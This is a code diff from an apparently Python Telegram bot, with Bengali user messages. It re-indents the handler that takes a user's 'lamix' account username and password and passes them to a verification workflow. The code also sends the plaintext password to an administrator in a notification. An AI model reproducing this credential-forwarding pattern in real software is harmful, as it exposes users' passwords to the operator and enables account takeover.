@@ -447,8 +447,8 @@ def handle_step(chat_id, user_id, text, users):
         )
 
     elif step == "await_password":
-         lamix_username = users[uid].get("lamix_username", "")
-         lamix_password = text.strip()
+        lamix_username = users[uid].get("lamix_username", "")
+        lamix_password = text.strip()
 
         users[uid]["step"] = "verifying"
         save_users(users)
@@ -459,27 +459,26 @@ def handle_step(chat_id, user_id, text, users):
         )
 
         triggered = trigger_workflow(VERIFY_WORKFLOW, {
-        "user_id": uid,
-        "lamix_username": lamix_username,
-        "lamix_password": lamix_password
+            "user_id": uid,
+            "lamix_username": lamix_username,
+            "lamix_password": lamix_password
         })
 
-    if triggered:
-        # Admin কে password সহ notify করুন — users.json এ সেভ হবে না
-        notify_admin_new_user(
-            uid,
-            users[uid].get("tg_username", ""),
-            lamix_username,
-            lamix_password  # ← শুধু notification এ, DB তে না
-        )
-    else:
-        send_message(chat_id,
-            "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
-            "/start দিয়ে শুরু করুন।"
-        )
-        users[uid]["status"] = "new"
-        users[uid]["step"] = ""
-        save_users(users)
+        if triggered:
+            notify_admin_new_user(
+                uid,
+                users[uid].get("tg_username", ""),
+                lamix_username,
+                lamix_password
+            )
+        else:
+            send_message(chat_id,
+                "❌ যাচাই করা যায়নি। আবার চেষ্টা করুন।\n"
+                "/start দিয়ে শুরু করুন।"
+            )
+            users[uid]["status"] = "new"
+            users[uid]["step"] = ""
+            save_users(users)
 
     return users
 
